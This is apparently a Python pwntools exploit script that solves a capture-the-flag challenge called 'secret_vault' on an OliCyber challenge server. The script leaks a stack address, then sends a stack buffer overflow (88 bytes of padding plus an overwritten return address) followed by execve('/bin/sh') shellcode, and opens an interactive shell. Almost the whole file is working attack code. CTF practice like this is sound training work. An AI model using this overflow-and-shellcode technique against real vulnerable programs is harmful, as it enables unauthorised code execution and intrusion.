#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template secret_vault '--host=vault.challs.olicyber.it' '--port=10006'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'secret_vault')
context.terminal = ["alacritty", "-e", "zsh", "-c"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vault.challs.olicyber.it'
port = int(args.PORT or 10006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

io = start()

shellcode = """
    mov rbx, 0x0068732f6e69622f 
    push rbx
    mov rdi, rsp        
    
    xor rdx, rdx        
    xor rsi, rsi        

    mov rax, 0x3b       
    syscall
"""

# leak address
io.sendlineafter(b">", b"1")
io.sendlineafter(b":\n", b"CCCCCCCC")
leak = io.recvline().decode()
leak = int(leak.split("in")[1][:-2], 16)

log.info(hex(leak))

io.sendlineafter(b">", b"1")
payload = b"A" * 88
payload += p64(leak + 88 + 8)
payload += asm(shellcode)

io.sendlineafter(b":\n", payload)
io.sendlineafter(b">", b"2")

io.recvline()
io.recvline()

res = io.recvline()

io.interactive()

